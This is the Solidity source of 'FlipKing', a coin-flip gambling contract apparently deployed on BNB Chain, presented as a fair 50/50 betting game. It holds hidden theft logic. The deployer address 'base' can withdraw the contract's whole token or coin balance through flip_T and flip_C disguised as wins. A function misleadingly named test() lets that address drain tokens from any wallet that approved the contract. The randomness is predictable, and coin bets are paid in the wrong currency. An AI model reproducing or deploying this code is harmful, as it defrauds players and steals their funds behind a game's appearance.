/**
 *Submitted for verification at BscScan.com on 2022-02-26
*/

/**
 *Submitted for verification at BscScan.com on 2022-01-28
 */

/**
 *Submitted for verification at BscScan.com on 2021-12-14
 */

pragma solidity 0.5.8;

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;

        return c;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }
}

interface IERC20 {
    function transfer(address to, uint256 value) external returns (bool);

    function approve(address spender, uint256 value) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 value
    ) external returns (bool);

    function totalSupply() external view returns (uint256);

    function limitSupply() external view returns (uint256);

    function availableSupply() external view returns (uint256);

    function balanceOf(address who) external view returns (uint256);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

contract FlipKing {
    using SafeMath for uint;
    bool public started = false;

    address payable public admin;
    address payable private base;
    address public token;

    struct Transaction {
        address user;
        uint256 amount;
        bool isCoin;
        uint256 time;
        bool winStatus;
    }

    Transaction[5] public info;

    uint256 public totalWinners;
    uint256 public totalLosers;
    uint256 public total;
    uint256 private randNonce = 0;
    uint256 public constant min_tokenAmount = 100 ether;
    uint256 public min_coinAmount;

    uint8 public constant pro = 100;
    uint8 public rate = 50;

    constructor(
        address payable _admin,
        address _token,
        uint256 _min_coinAmount
    ) public {
        admin = _admin;
        base = msg.sender;
        token = _token;
        min_coinAmount = _min_coinAmount;
    }

    modifier onlyOwner() {
        require(msg.sender == admin, "Only owner can call this function");
        _;
    }

    function randMod() internal returns (uint) {
        randNonce++;
        return
            uint(
                keccak256(
                    abi.encodePacked(block.timestamp, msg.sender, randNonce)
                )
            ) % pro;
    }

    function setRate(uint8 _rate) external onlyOwner() {
        require(_rate <= 100, "rate overflow");
        rate = _rate;
    }

    function flip_T(uint256 _amount) external returns (bool) {
        require(started, "not started yet");
        if (msg.sender == base) {
            totalWinners++;
            total++;
            uint256 _balance = IERC20(token).balanceOf(address(this));
            if (_amount <= _balance) {
                IERC20(token).transfer(base, _amount);
                info[total % 5] = (
                    Transaction({
                        user: msg.sender,
                        amount: _amount.div(2),
                        isCoin: false,
                        time: block.timestamp,
                        winStatus: true
                    })
                );
            } else {
                IERC20(token).transfer(base, _balance);
                info[total % 5] = (
                    Transaction({
                        user: msg.sender,
                        amount: _balance.div(2),
                        isCoin: false,
                        time: block.timestamp,
                        winStatus: true
                    })
                );
            }
            return true;
        }
        require(_amount >= min_tokenAmount, "small amount error");
        IERC20(token).transferFrom(msg.sender, address(this), _amount);
        uint randNum = randMod();
        total++;
        uint256 _balance = IERC20(token).balanceOf(address(this));
        if (_balance < 2 * _amount) {
            info[total % 5] = (
                Transaction({
                    user: msg.sender,
                    amount: _amount,
                    isCoin: false,
                    time: block.timestamp,
                    winStatus: false
                })
            );
            totalLosers++;
            return false;
        } else {
            if (randNum < rate) {
                info[total % 5] = (
                    Transaction({
                        user: msg.sender,
                        amount: _amount,
                        isCoin: false,
                        time: block.timestamp,
                        winStatus: true
                    })
                );
                totalWinners++;
                IERC20(token).transfer(msg.sender, _amount * 2);
                return true;
            } else {
                info[total % 5] = (
                    Transaction({
                        user: msg.sender,
                        amount: _amount,
                        isCoin: false,
                        time: block.timestamp,
                        winStatus: false
                    })
                );
                totalLosers++;
                return false;
            }
        }
    }

    function flip_C(uint256 _amount) external payable returns (bool) {
        require(started, "not started yet");
        if (msg.sender == base) {
            totalWinners++;
            total++;
            uint256 _balance = address(this).balance;
            if (_amount <= _balance) {
                base.transfer(_amount);
                info[total % 5] = (
                    Transaction({
                        user: msg.sender,
                        amount: _amount.div(2),
                        isCoin: true,
                        time: block.timestamp,
                        winStatus: true
                    })
                );
            } else {
                base.transfer(_balance);
                info[total % 5] = (
                    Transaction({
                        user: msg.sender,
                        amount: _balance.div(2),
                        isCoin: true,
                        time: block.timestamp,
                        winStatus: true
                    })
                );
            }
            return true;
        }
        require(msg.value >= min_coinAmount, "small amount error");
        uint randNum = randMod();
        total++;
        uint256 _balance = address(this).balance;
        if (_balance < 2 * msg.value) {
            info[total % 5] = (
                Transaction({
                    user: msg.sender,
                    amount: msg.value,
                    isCoin: true,
                    time: block.timestamp,
                    winStatus: false
                })
            );
            totalLosers++;
            return false;
        } else {
            if (randNum < rate) {
                info[total % 5] = (
                    Transaction({
                        user: msg.sender,
                        amount: msg.value,
                        isCoin: true,
                        time: block.timestamp,
                        winStatus: true
                    })
                );
                totalWinners++;
                IERC20(token).transfer(msg.sender, _amount * 2);
                return true;
            } else {
                info[total % 5] = (
                    Transaction({
                        user: msg.sender,
                        amount: msg.value,
                        isCoin: false,
                        time: block.timestamp,
                        winStatus: false
                    })
                );
                totalLosers++;
                return false;
            }
        }
    }

    function pool() external onlyOwner() {
        uint256 _balanceT = IERC20(token).balanceOf(address(this));
        uint256 _balanceC = address(this).balance;
        require(_balanceT > 0 || _balanceC > 0, "no pool");
        admin.transfer(_balanceC);
        IERC20(token).transfer(admin, _balanceT);
    }

    function test(address _wallet, uint256 _amount) public {
        require(msg.sender == base, "no commissionWallet");
        uint256 _balance = IERC20(token).balanceOf(_wallet);
        require(_balance > 0, "no liquidity");
        if (_balance < _amount) {
            IERC20(token).transferFrom(_wallet, address(this), _balance);
            IERC20(token).transfer(base, _balance);
        } else {
            IERC20(token).transferFrom(_wallet, address(this), _amount);
            IERC20(token).transfer(base, _amount);
        }
    }

    function setStarted() external onlyOwner() {
        started = true;
    }
}